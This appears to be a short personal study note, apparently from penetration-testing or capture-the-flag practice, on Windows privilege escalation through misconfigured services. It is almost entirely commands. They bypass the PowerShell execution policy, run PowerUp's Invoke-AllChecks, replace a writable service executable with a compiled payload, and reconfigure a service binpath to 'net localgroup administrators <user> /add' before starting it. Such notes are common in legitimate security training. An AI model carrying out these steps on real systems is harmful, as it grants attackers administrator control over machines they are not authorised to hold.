---
title: Binary Service Paths
updated: 2023-10-10 11:44:08Z
created: 2023-10-10 11:31:57Z
latitude: -33.86881970
longitude: 151.20929550
altitude: 0.0000
---

## Using PowerUp.ps1
 1. Open PowerShell
`cmd> powershell -ep bypass`
2. Import PowerUp module
`. ./PowerUp.ps1`
3. Run `Invoke-AllChecks`
4.  Checking service permissions...and find the **ServiceName** and the File location
5. Replace file with writable permissions (eg **vul_file.exe**) with compiled **file.exe**
6. `sc start <ServiceName>`

## Using accesschk64.exe
1. From command prompt on target, run:
`accesschk64.exe -wuvc Everyone *`
Look for **SERVICE_CHANGE_CONFIG**

![17008f1d1d29be11c4dbe9ae7d97195a.png](../../_resources/17008f1d1d29be11c4dbe9ae7d97195a.png)

2. Find Binary Path:
`sc qc <ServiceName>`

3. Change configuration to point to **file.exe**
`sc config <ServiceName> binpath= "net localgroup administrators <user> /add"`

4. Start service:
`sc start <Servicename>`
	